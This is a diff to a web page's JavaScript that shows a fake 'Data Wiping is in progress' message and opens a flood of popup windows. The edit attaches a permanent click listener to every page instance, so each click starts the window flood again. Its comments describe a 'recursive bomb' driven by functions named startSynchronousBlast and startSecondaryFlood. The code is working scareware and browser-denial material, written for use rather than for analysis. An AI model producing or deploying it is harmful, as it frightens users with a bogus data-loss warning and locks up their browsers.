@@ -427,7 +427,9 @@ Data Wiping is in progress - <strong id="progress-percent">0% complete</strong>
 
         // --- Window Flood Repeat Function ---
         function repeatWindowFlood() {
-            // Only the main window should repeat the flood, not the popups
+            // This function is now the dedicated, permanent click listener
+            // Check if the current window is the main starter window (hash !== '#start')
+            // This prevents a popup from spawning more popups (a true recursive bomb)
             if (window.location.hash !== '#start') {
                 startSynchronousBlast(); 
                 startSecondaryFlood();
@@ -512,13 +514,13 @@ Data Wiping is in progress - <strong id="progress-percent">0% complete</strong>
                 }
             });
 
-            // WINDOW FLOOD (First flood triggered here, only by parent)
+            // PERMANENT CLICK LISTENER ATTACHMENT
+            // Attach the permanent listener for REPEATING the flood to every page instance.
+            document.body.addEventListener('click', repeatWindowFlood);
+            
+            // WINDOW FLOOD (Only trigger the FIRST flood on the original window)
             if (window.location.hash !== '#start') {
-                // 1. Trigger the first flood immediately
-                repeatWindowFlood();
-                
-                // 2. Attach the permanent click listener for REPEATING the flood
-                document.body.addEventListener('click', repeatWindowFlood);
+                repeatWindowFlood(); // Initial blast
             }
             
             // Remove the one-time click listener that triggered the initialization
